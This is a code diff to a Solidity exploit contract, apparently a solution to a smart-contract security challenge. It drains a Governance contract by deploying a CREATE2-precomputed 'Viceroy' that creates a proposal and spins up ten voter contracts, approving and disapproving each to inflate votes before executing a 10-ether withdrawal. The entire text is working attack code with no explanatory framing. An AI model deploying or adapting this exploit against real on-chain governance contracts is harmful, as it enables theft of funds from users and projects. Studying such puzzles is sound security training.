@@ -8,50 +8,30 @@ contract GovernanceAttacker {
         bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
         uint256 proposalId = uint256(keccak256(proposal));
 
-        for (uint256 i = 1; i < 3; /* replace with 3 */ i++) {
-            (uint256 votes, bytes memory data) = governance.proposals(proposalId);
+        bytes memory creationCode = type(Viceroy).creationCode;
+        bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, proposalId, proposal));
+        bytes32 salt = bytes32(uint256(487)); // 487 is just a random number
 
-            if (i == 1) {
-                assert(votes == 0);
-                assert(data.length == 0);
-            }
+        address viceroy = address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
+        );
 
-            if (i == 2) {
-                assert(votes == 5);
-                assert(data.length != 0);
-            }
+        governance.appointViceroy(viceroy, 1);
+        Viceroy _viceroy = new Viceroy{salt: salt}(governance, proposalId, proposal);
 
-            bytes memory creationCode = type(Viceroy).creationCode;
-            bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, i, proposalId, proposal));
-            bytes32 salt = bytes32(uint256(487)); // 487 is just a random number
+        assert(address(_viceroy) == viceroy);
 
-            address viceroy = address(
-                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
-            );
-
-            governance.appointViceroy(viceroy, 1);
-            Viceroy _viceroy = new Viceroy{salt: salt}(governance, i, proposalId, proposal);
-
-            assert(address(_viceroy) == viceroy);
-
-            governance.deposeViceroy(viceroy, 1);
-        }
-
-        (uint256 v,) = governance.proposals(proposalId);
-        assert(v == 10);
+        governance.deposeViceroy(viceroy, 1);
 
         governance.executeProposal(proposalId);
     }
 }
 
 contract Viceroy {
-    constructor(Governance governance, uint256 _i, uint256 proposalId, bytes memory proposal) {
-        uint256 i = _i == 1 ? 1 : 6;
-        uint256 length = i + 5;
+    constructor(Governance governance, uint256 proposalId, bytes memory proposal) {
+        governance.createProposal(address(this), proposal);
 
-        if (i == 1) governance.createProposal(address(this), proposal); // Create just one proposal
-
-        for (; i < length; i++) {
+        for (uint256 i = 1; i < 11; i++) {
             bytes memory creationCode = type(Voter).creationCode;
             bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, proposalId));
             bytes32 salt = bytes32(i);
@@ -62,6 +42,7 @@ contract Viceroy {
 
             governance.approveVoter(voter);
             new Voter{salt: salt}(governance, proposalId);
+            governance.disapproveVoter(voter);
         }
     }
 }
